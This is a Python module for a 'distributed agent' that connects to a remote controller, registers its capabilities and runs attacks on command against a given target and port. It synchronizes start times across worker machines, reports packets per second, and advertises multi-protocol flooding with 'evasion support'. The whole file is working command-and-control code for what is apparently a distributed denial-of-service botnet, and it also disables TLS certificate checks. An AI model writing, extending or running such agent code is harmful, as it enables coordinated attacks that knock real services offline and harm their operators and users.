"""
Distributed Agent

Agent that connects to a controller and executes attacks.
Runs on worker machines in a distributed setup.
"""

import asyncio
import socket
import ssl
import time
import uuid
import platform
import struct
from dataclasses import dataclass
from typing import Optional, Dict, Any, Callable
import logging

from .protocol import (
    ControlMessage, MessageType, AgentStatus, AttackConfig, MessageBuilder
)

logger = logging.getLogger(__name__)


@dataclass
class AgentConfig:
    """Configuration for the distributed agent"""
    controller_host: str = "localhost"
    controller_port: int = 9999
    secret_key: bytes = b""
    heartbeat_interval: float = 5.0
    reconnect_interval: float = 10.0
    max_reconnect_attempts: int = 10
    use_ssl: bool = False


class DistributedAgent:
    """
    Distributed agent for executing attacks.
    
    Features:
    - Automatic controller connection
    - Heartbeat and status reporting
    - Attack execution with local optimization
    - Graceful shutdown and reconnection
    """
    
    def __init__(self, config: Optional[AgentConfig] = None):
        self.config = config or AgentConfig()
        self.agent_id = f"agent-{uuid.uuid4().hex[:8]}"
        self.hostname = platform.node()
        self.msg_builder = MessageBuilder(self.agent_id)
        
        # Connection state
        self._reader: Optional[asyncio.StreamReader] = None
        self._writer: Optional[asyncio.StreamWriter] = None
        self._connected = False
        self._running = False
        
        # Agent state
        self.status = AgentStatus.OFFLINE
        self.current_attack: Optional[AttackConfig] = None
        self._attack_task: Optional[asyncio.Task] = None
        
        # Statistics
        self.stats: Dict[str, Any] = {
            'packets_sent': 0,
            'bytes_sent': 0,
            'errors': 0,
            'pps': 0,
        }
        
        # Tasks
        self._heartbeat_task: Optional[asyncio.Task] = None
        self._receive_task: Optional[asyncio.Task] = None
        
        # Attack callback
        self._attack_callback: Optional[Callable] = None
        
    def set_attack_callback(self, callback: Callable):
        """
        Set callback for executing attacks.
        
        Callback signature: async def attack(config: AttackConfig, stats_callback: Callable)
        """
        self._attack_callback = callback
        
    async def start(self):
        """Start the agent and connect to controller"""
        logger.info(f"Starting agent {self.agent_id}")
        self._running = True
        
        # Connect to controller
        connected = await self._connect()
        if not connected:
            logger.error("Failed to connect to controller")
            return False
            
        # Start background tasks
        self._heartbeat_task = asyncio.create_task(self._heartbeat_loop())
        self._receive_task = asyncio.create_task(self._receive_loop())
        
        logger.info(f"Agent started: {self.agent_id}")
        return True
        
    async def stop(self):
        """Stop the agent"""
        logger.info("Stopping agent...")
        self._running = False
        
        # Stop attack if running
        if self._attack_task:
            self._attack_task.cancel()
            try:
                await self._attack_task
            except asyncio.CancelledError:
                pass
                
        # Cancel background tasks
        for task in [self._heartbeat_task, self._receive_task]:
            if task:
                task.cancel()
                try:
                    await task
                except asyncio.CancelledError:
                    pass
                    
        # Close connection
        await self._disconnect()
        
        logger.info("Agent stopped")
        
    async def _connect(self) -> bool:
        """Connect to controller"""
        attempts = 0
        
        while self._running and attempts < self.config.max_reconnect_attempts:
            try:
                logger.info(f"Connecting to {self.config.controller_host}:{self.config.controller_port}")
                
                # Create SSL context if needed
                ssl_context = None
                if self.config.use_ssl:
                    ssl_context = ssl.create_default_context()
                    ssl_context.check_hostname = False
                    ssl_context.verify_mode = ssl.CERT_NONE
                
                self._reader, self._writer = await asyncio.open_connection(
                    self.config.controller_host,
                    self.config.controller_port,
                    ssl=ssl_context
                )
                
                # Send registration
                capabilities = self._get_capabilities()
                msg = self.msg_builder.register(self.hostname, capabilities)
                await self._send_message(msg)
                
                # Wait for acknowledgment
                response = await self._receive_message(timeout=10.0)
                if response and response.msg_type == MessageType.REGISTER_ACK:
                    if response.payload.get('accepted'):
                        self._connected = True
                        self.status = AgentStatus.IDLE
                        
                        # Update heartbeat interval from controller
                        if 'heartbeat_interval' in response.payload:
                            self.config.heartbeat_interval = response.payload['heartbeat_interval']
                            
                        logger.info("Connected and registered with controller")
                        return True
                    else:
                        reason = response.payload.get('reason', 'unknown')
                        logger.error(f"Registration rejected: {reason}")
                        
            except Exception as e:
                logger.error(f"Connection failed: {e}")
                
            attempts += 1
            if self._running:
                await asyncio.sleep(self.config.reconnect_interval)
                
        return False
        
    async def _disconnect(self):
        """Disconnect from controller"""
        self._connected = False
        self.status = AgentStatus.OFFLINE
        
        if self._writer:
            self._writer.close()
            try:
                await self._writer.wait_closed()
            except Exception:
                pass
            self._writer = None
            self._reader = None
            
    async def _send_message(self, msg: ControlMessage):
        """Send message to controller"""
        if not self._writer:
            return
            
        data = msg.to_bytes(self.config.secret_key if self.config.secret_key else None)
        self._writer.write(data)
        await self._writer.drain()
        
    async def _receive_message(self, timeout: float = None) -> Optional[ControlMessage]:
        """Receive message from controller"""
        if not self._reader:
            return None
            
        try:
            # Read length prefix
            if timeout:
                length_data = await asyncio.wait_for(
                    self._reader.read(4), timeout=timeout
                )
            else:
                length_data = await self._reader.read(4)
                
            if not length_data:
                return None
                
            length = struct.unpack('>I', length_data)[0]
            
            # Read message body
            data = await self._reader.read(length)
            if not data:
                return None
                
            return ControlMessage.from_bytes(
                length_data + data,
                self.config.secret_key if self.config.secret_key else None
            )
            
        except asyncio.TimeoutError:
            return None
        except Exception as e:
            logger.error(f"Receive error: {e}")
            return None
            
    async def _heartbeat_loop(self):
        """Send periodic heartbeats to controller"""
        while self._running and self._connected:
            try:
                msg = self.msg_builder.heartbeat(self.status, self.stats)
                await self._send_message(msg)
            except Exception as e:
                logger.error(f"Heartbeat error: {e}")
                
            await asyncio.sleep(self.config.heartbeat_interval)
            
    async def _receive_loop(self):
        """Receive and handle messages from controller"""
        while self._running and self._connected:
            try:
                msg = await self._receive_message(timeout=1.0)
                if msg:
                    await self._handle_message(msg)
            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error(f"Receive loop error: {e}")
                
                # Check if disconnected
                if not self._connected:
                    # Try to reconnect
                    await self._connect()
                    
    async def _handle_message(self, msg: ControlMessage):
        """Handle incoming control message"""
        
        if msg.msg_type == MessageType.START_ATTACK:
            await self._handle_start_attack(msg)
            
        elif msg.msg_type == MessageType.STOP_ATTACK:
            await self._handle_stop_attack(msg)
            
        elif msg.msg_type == MessageType.PAUSE_ATTACK:
            await self._handle_pause_attack(msg)
            
        elif msg.msg_type == MessageType.RESUME_ATTACK:
            await self._handle_resume_attack(msg)
            
        elif msg.msg_type == MessageType.READY_CHECK:
            await self._handle_ready_check(msg)
            
        elif msg.msg_type == MessageType.STATUS_REQUEST:
            await self._handle_status_request(msg)
            
        elif msg.msg_type == MessageType.SHUTDOWN:
            await self._handle_shutdown(msg)
            
        elif msg.msg_type == MessageType.HEARTBEAT_ACK:
            # Update time sync if needed
            pass
            
    async def _handle_start_attack(self, msg: ControlMessage):
        """Handle start attack command"""
        config_dict = msg.payload.get('config', {})
        config = AttackConfig.from_dict(config_dict)
        
        logger.info(f"Starting attack: {config.target}:{config.port} ({config.protocol})")
        
        # Wait for synchronized start time
        if config.start_time > 0:
            delay = config.start_time - time.time()
            if delay > 0:
                logger.info(f"Waiting {delay:.2f}s for synchronized start")
                await asyncio.sleep(delay)
                
        self.current_attack = config
        self.status = AgentStatus.ATTACKING
        
        # Reset stats
        self.stats = {
            'packets_sent': 0,
            'bytes_sent': 0,
            'errors': 0,
            'pps': 0,
            'start_time': time.time(),
        }
        
        # Start attack task
        if self._attack_callback:
            self._attack_task = asyncio.create_task(
                self._run_attack(config)
            )
        else:
            logger.warning("No attack callback set")
            
    async def _handle_stop_attack(self, msg: ControlMessage):
        """Handle stop attack command"""
        logger.info("Stopping attack")
        
        if self._attack_task:
            self._attack_task.cancel()
            try:
                await self._attack_task
            except asyncio.CancelledError:
                pass
            self._attack_task = None
            
        self.current_attack = None
        self.status = AgentStatus.IDLE
        
    async def _handle_pause_attack(self, msg: ControlMessage):
        """Handle pause attack command"""
        logger.info("Pausing attack")
        self.status = AgentStatus.PAUSED
        
    async def _handle_resume_attack(self, msg: ControlMessage):
        """Handle resume attack command"""
        logger.info("Resuming attack")
        self.status = AgentStatus.ATTACKING
        
    async def _handle_ready_check(self, msg: ControlMessage):
        """Handle ready check from controller"""
        ready = self.status in [AgentStatus.IDLE, AgentStatus.READY]
        
        if ready:
            self.status = AgentStatus.READY
            
        response = self.msg_builder.ready_ack(ready)
        await self._send_message(response)
        
    async def _handle_status_request(self, msg: ControlMessage):
        """Handle status request"""
        response = self.msg_builder.status_report(self.status, self.stats)
        await self._send_message(response)
        
    async def _handle_shutdown(self, msg: ControlMessage):
        """Handle shutdown command"""
        logger.info("Received shutdown command")
        
        # Send acknowledgment
        response = ControlMessage(
            msg_type=MessageType.SHUTDOWN_ACK,
            sender_id=self.agent_id,
        )
        await self._send_message(response)
        
        # Stop agent
        await self.stop()
        
    async def _run_attack(self, config: AttackConfig):
        """Run the attack using the callback"""
        try:
            def stats_callback(stats: Dict[str, Any]):
                self.stats.update(stats)
                
            await self._attack_callback(config, stats_callback)
            
        except asyncio.CancelledError:
            logger.info("Attack cancelled")
        except Exception as e:
            logger.error(f"Attack error: {e}")
            self.status = AgentStatus.ERROR
            
            # Report error to controller
            error_msg = self.msg_builder.error_report(str(e))
            await self._send_message(error_msg)
        finally:
            if self.status == AgentStatus.ATTACKING:
                self.status = AgentStatus.IDLE
                
    def _get_capabilities(self) -> Dict[str, Any]:
        """Get agent capabilities"""
        import psutil
        
        return {
            'platform': platform.system(),
            'platform_version': platform.release(),
            'python_version': platform.python_version(),
            'cpu_count': psutil.cpu_count(),
            'memory_gb': round(psutil.virtual_memory().total / (1024**3), 2),
            'protocols': ['TCP', 'UDP', 'HTTP', 'HTTPS', 'DNS', 'ICMP'],
            'evasion_support': True,
            'max_pps': 1000000,  # Estimated
        }
        
    def update_stats(self, **kwargs):
        """Update agent statistics"""
        self.stats.update(kwargs)
        
        # Calculate PPS
        if 'packets_sent' in self.stats and 'start_time' in self.stats:
            elapsed = time.time() - self.stats['start_time']
            if elapsed > 0:
                self.stats['pps'] = int(self.stats['packets_sent'] / elapsed)
